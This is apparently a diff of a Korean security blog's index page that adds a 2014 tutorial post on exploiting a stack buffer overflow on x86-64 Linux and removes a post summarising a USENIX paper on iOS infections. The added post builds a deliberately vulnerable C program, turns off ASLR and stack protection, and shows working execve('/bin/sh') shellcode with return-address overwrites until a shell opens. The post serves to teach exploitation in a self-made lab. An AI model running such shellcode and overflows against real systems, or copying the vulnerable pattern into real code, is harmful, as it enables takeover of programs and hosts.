@@ -9,7 +9,7 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="이번에는 쉘코드를 2 개로 나누어서, 첫번째는 retq 로 끊는다. return address 2 개를 적재하여, retq 로 두번쨰 gadget 이 실행되도록 한다. 첫번째 _shellcode 의 \xc3 이 retq 이다. char *_shellcode &hellip;">
+  <meta name="description" content="vic.c 이제 vulnerable 한 실행화일을 외부에서 exploit 해보자. 일단 우분투에서 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 커맨드로 ASLR 을 끄고, -fno-stack-protector -z &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -65,6 +65,140 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/11/10/linux-x86-64-shellcode-5/">Linux X86_64 Shellcode 5</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-11-10T22:26:30+09:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>10:26 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h5>vic.c</h5>
+
+<p>이제 vulnerable 한 실행화일을 외부에서 exploit 해보자.</p>
+
+<p>일단 우분투에서 <code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code> 커맨드로 ASLR 을 끄고, <code>-fno-stack-protector -z execstack</code> 으로 취약한 executable 을 만든다.</p>
+
+<pre><code>unsigned long esp(void)
+{
+    __asm__("mov %rsp,%rax");
+}
+void main(int ac, char **av)
+{
+    char arr[512];
+    if (ac &gt; 1) {
+        printf("address of arr: %lx\n",&amp;arr);
+        printf("esp: %lx\n",esp());
+        strcpy(arr, av[1]);
+    }
+}
+
+# echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+$ gcc -fno-stack-protector -z execstack -o vic vic.c
+</code></pre>
+
+<h5>Smash!</h5>
+
+<p>이제 터뜨려본다.</p>
+
+<pre><code>z@ubuntu:~/shell$ ./vic $(printf "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05%0480x\x70\xdc\xff\xff\xff\x7f\x00\x00" 0)
+address of arr: 7fffffffdc70
+esp: 7fffffffdc50
+z@ubuntu:~/shell$
+</code></pre>
+
+<p>arr 의 주소는 <code>0x7fffffffdc70</code> 이었다. 아무일 없다.</p>
+
+<p>482 시도</p>
+
+<pre><code>z@ubuntu:~/shell$ ./vic $(printf "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05%0482x\x60\xdc\xff\xff\xff\x7f\x00\x00" 0)
+address of arr: 7fffffffdc60
+esp: 7fffffffdc40
+Segmentation fault (core dumped)
+</code></pre>
+
+<p>이번에는 arr 의 주소가 <code>0x7fffffffdc60</code> 으로 바뀌었다.
+coredump 가 난다.
+<code>return address</code> 를 <code>0x007fffffffdc60</code> 으로 overwrite 하기로 한다. arg 의 마지막을 <code>\x60\xdc\xff\xff\xff\x7f\x00\x00</code> 로 맞춰준다. arg 의 첫부분은 shellcode 로 맞춰준다. 가운데의 <code>\%0482x</code> 으로 길이를 조절한다.</p>
+
+<p>485 시도</p>
+
+<pre><code>z@ubuntu:~/shell$ ./vic $(printf "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05%0485x\x60\xdc\xff\xff\xff\x7f\x00\x00" 0)
+address of arr: 7fffffffdc60
+esp: 7fffffffdc40
+Segmentation fault (core dumped)
+</code></pre>
+
+<p>486 시도</p>
+
+<pre><code>z@ubuntu:~/shell$ ./vic $(printf "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05%0486x\x60\xdc\xff\xff\xff\x7f\x00\x00" 0)
+address of arr: 7fffffffdc60
+esp: 7fffffffdc40
+Segmentation fault (core dumped)
+</code></pre>
+
+<p>487 시도</p>
+
+<pre><code>z@ubuntu:~/shell$ ./vic $(printf "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05%0487x\x60\xdc\xff\xff\xff\x7f\x00\x00" 0)
+address of arr: 7fffffffdc60
+esp: 7fffffffdc40
+$
+</code></pre>
+
+<p>터졌다.</p>
+
+<p>code 를 수정해, rbp,rsp, arr 를 덤프해서 주소들을 비교해보았다.</p>
+
+<pre><code>z@ubuntu:~/shell$ ./vic $(printf "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05%0487x\x60\xdc\xff\xff\xff\x7f\x00\x00" 0)
+address of arr: 7fffffffdc60 &lt;- main 에 있는 arr 주소
+rsp: 7fffffffdc40 &lt;- subfunction 의 %rsp
+arr dump: &lt;- arr 에 shellcode 가 제대로 적재되었는가?
+48 &lt;- xor %rdx,%rdx
+31
+d2
+got it! 7fffffffde68 &lt;- \x60\xdc\xff\xff\xff\x7f\x00\x00 이 있는 주소
+7fffffffde60: 3030303030303030 &lt;- saved %rbp 가 '0' 으로 뭉개졌다
+7fffffffde68: 00007fffffffdc60 &lt;- address of arr 로 overwrite 되었다
+7fffffffde70: 0000000000000000
+7fffffffde78: 00007fffffffdf48
+7fffffffde60: 00007fffffffde60 &lt;- %rbp 를 덤프해보았다
+$ 
+
+00007fffffffde68 &lt;- return address of main()
+00007fffffffde60 &lt;- %rbp
+00007fffffffdc60 &lt;- start of 'arr' (0x200 bytes)
+00007fffffffdc40 &lt;- subfunction frame 이 셋업되고 그 %rsp
+</code></pre>
+
+<h5>참고</h5>
+
+<ul>
+<li><a href="http://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization">How can I temporarily disable ASLR (Address space layout randomization)?</a></li>
+<li><a href="http://stackoverflow.com/questions/5863252/disabling-stack-smashing-protection-in-ubuntu-11-04">Disabling Stack Smashing Protection in Ubuntu 11.04</a></li>
+<li><a href="http://stackoverflow.com/questions/23276488/why-is-execstack-required-to-execute-code-on-the-heap">Why is execstack required to execute code on the heap?</a></li>
+<li><a href="http://www.exploit-db.com/papers/24085/">Stack Smashing On A Modern Linux System</a></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -832,58 +966,6 @@ public class Main {
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/09/22/on-the-feasibility-of-large-scale-infections-of-ios-devices/">On the Feasibility of Large-Scale Infections of iOS Devices</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-09-22T09:00:23+09:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>22</span><span class='date-suffix'>nd</span>, <span class='date-year'>2014</span></span> <span class='time'>9:00 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>23rd USENIX Security Symposium 에서 발표된 <a href="https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-wang-tielei.pdf">On the Feasibility of Large-Scale Infections of iOS Devices</a> 을 따라가보자.</p>
-
-<p>저자는 Tielei Wang, Yeongjin Jang, Yizheng Chen, Simon Chung, Billy Lau, Wenke Lee.</p>
-
-<h4>Introduction</h4>
-
-<p>Non-jailbroken iOS 디바이스를 대규모로 감염시키는 것이 어려운 이유.</p>
-
-<ol>
-<li><p>Apple has powerful revocation capabilities.</p></li>
-<li><p>The mandatory code signing mechanism in iOS ensures that only apps signed by Apple or certified by Apple can be installed and run on iOS devices.</p></li>
-<li><p>The DRM technology in iOS prevents users from sharing apps among arbitary iOS devices, which has a side effect of limiting the distribution of malicious apps published on the App Store.</p></li>
-</ol>
-
-
-<h4>Delivery of Apple-Signed Malicious Apps</h4>
-
-<p>두 개의 취약점을 사용했다고 한다.</p>
-
-<ol>
-<li><p>The first is a previously unknown design flaw in the iTunes syncing mechanism, which makes the iTunes syncing process vulnerable to MiTM attacks.</p></li>
-<li><p>The second security issue we discovered is that an iOS device can be stealthily provisioned for development through USB connections. This weakness allows a compromised computer to arbitrarily remove installed third-party appps from connected iOS devices and install any app signed by attackers in possession of enterprise or indivisual developer licenses issued by Apple.</p></li>
-</ol>
-
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/13">&larr; Older</a>
@@ -901,6 +983,10 @@ public class Main {
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/05/03/security-analysis-of-emerging-smart-home-applications/">Security Analysis of Emerging Smart Home Applications</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/04/26/rsa-sample-number/">RSA Sample Number</a>
       </li>
     
@@ -914,10 +1000,6 @@ public class Main {
     
       <li class="post">
         <a href="/blog/2016/02/25/mnist-for-ml-beginners/">MNIST for ML Beginners</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/02/16/plaid-ctf-2015-one-null-byte/">Plaid CTF 2015 - One NULL Byte</a>
       </li>
     
   </ul>
